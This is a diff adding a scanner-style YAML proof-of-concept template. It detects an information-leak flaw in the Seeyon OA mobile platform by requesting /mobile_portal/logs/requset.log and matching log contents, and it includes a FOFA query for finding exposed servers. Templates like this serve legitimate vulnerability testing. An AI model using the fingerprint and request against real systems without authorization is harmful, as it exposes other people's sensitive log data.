@@ -1,0 +1,17 @@
+id: poc-yaml-seeyon-logs-requset-info-leak
+info:
+  name: 致远OA移动智能办公平台 /mobile_portal/logs/requset.log 敏感信息泄露漏洞
+  severity: medium
+  tags:
+  - 信息泄露
+  finger: 致远OA移动智能办公平台
+  fofa: title="M3-Server"
+variables:
+  time: datetime("2006-01-02")
+requests:
+- method: GET
+  path: /mobile_portal/logs/requset.log
+  expression: "status_code == 200 && \ncontains(body,\"#INFO\") &&\ncontains(body,\"\
+    [ OPEN]\") &&\ncontains(body,\"REQ.open\") &&\ncontains(body,\"[H-\") &&\ncontains(body,time)\
+    \ &&\n!contains(body,\"<\") &&\ncontains(headers,\"text/plain\")\n"
+transport: http
